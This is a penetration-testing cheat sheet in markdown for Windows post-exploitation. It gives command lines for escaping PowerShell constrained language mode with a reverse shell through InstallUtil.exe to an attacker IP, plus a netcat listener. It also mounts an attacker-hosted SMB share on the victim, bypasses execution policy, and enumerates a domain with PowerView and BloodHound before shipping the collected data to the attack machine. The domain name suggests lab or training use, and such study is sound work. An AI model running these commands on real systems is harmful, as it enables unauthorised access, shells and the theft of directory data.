# Post Exploitation Enumeration

## Link to cheatsheet upload files to victim
https://github.com/RustySoldier/PentestSheet/blob/main/OtherCheatSheets/LinkstoOtherCheatsheets.md#cheatsheet3file-transfer-techniques


## Language check
```
$executioncontext.sessionstate.languagemode
```
if the above gives the below output we are in contrained language mode<br>
![image](https://user-images.githubusercontent.com/115465242/209971772-daf6bdfb-3e0b-42fd-aff0-8b9f642a3d46.png)
<br>
Use the following tool to get out of it!<br>
[PsBypassCLM](https://github.com/padovah4ck/PSByPassCLM)<br>
### Usage
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
in our machine 
```
rlwrap nc -nvlp 443
```
## Creating a PS-share drive
1. Many times we will have to use multiple tools and we will have to upload it again and again
2. this bypasses it
3. if we have evil-winrm shell try to do this!
### On Our machine
1. make a directory to share using mkdir and then cd there
2. use smbserver.py as follows
```
smbserver.py $(pwd) share_name -smb2support -username user_name -password pass_word
```
3. And wait

### On the victim machine do
```
$pass = convertto-securestring 'pass_word' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user_name',$pass)
New-PSDrive -Name user_name -PSProvider FileSystem -Credential $cred -Root \\Attk-IP\share_name
```
## Domain Enumeration with PowerView(doesnt work with powershell v1 needs v2) 
1. powershell -ep bypass 
2. . .\powerview.ps1

### List of enums
1. Get-NetDomain
2. Get-NetDomainController
3. Get-DomainPolicy
4. (Get-DomainPolicy)."SystemAccess"  
5. Get-NetUser
6. Get-NetUser | select cn (gives username)
7. Get-NetUser | select samaccountname
8. Get-NetUser | select description
9. Get-UserProperty
10. Get-NetComputer -FullData (use select to get specific results as shown above.
11. Get-NetGroup 
12. Get-NetGroup -GroupName " " (can use \*admin\* for all)
13. Invoke-ShareFinder
14. Get-NetGPO

**Link to more commands**
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## Enum with bloodhound
1. put invoke-bloodhound.ps1 in victim machine
2. . .\invoke-bloodhound.ps1
3. Invoke-BloodHound -CollectionMethod All -Domain Marvel.local -ZipFileName file.zip
4. Transfer the file to attack machine 
5. sudo neo4j console 
6. in another tab sudo bloodhound
7. upload the file to bloodhound and after it populates the db enum using analysis
8. such as shortest path to domain admin etc etc etc


